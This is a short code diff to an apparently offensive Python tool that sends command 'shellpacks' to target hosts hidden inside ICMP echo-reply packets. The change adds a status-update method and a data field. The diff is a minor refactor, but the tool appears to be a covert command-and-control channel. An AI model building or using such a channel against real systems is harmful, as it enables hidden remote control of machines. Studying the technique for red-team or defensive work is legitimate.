@@ -30,8 +30,13 @@ class Target(Host):
         self.iface = shellpack['iface']
         self.mac = shellpack['mac']
         self.user = shellpack['user']
-        self.status = "STANDBY"
+        self.status = ""
+        self.update_status("STANDBY")
         self.heartbeat = 0
+
+    def update_status(self, status):
+        self.status = status
+        print(f" - Status of target {self.ip} has been updated to {status}")
 
 def send(ip, shellpack: str) -> bool:
         data = (IP(dst=ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
@@ -60,10 +65,11 @@ def get_mac(iface) -> str:
     mac = ([j.address for i in nics for j in nics[i] if i==iface and j.family==psutil.AF_LINK])[0]
     return mac.replace('-',':')
 
-def build_shellpack(host, command: str, message: str | None = None) -> dict:
+def build_shellpack(host, command: str, message: str | None = None, data: str | None = None) -> dict:
     shellpack = {
         "command": command,
         "message": message,
+        "data" : data,
         "ip": host.ip,
         "mac": host.mac,
         "iface": host.iface,
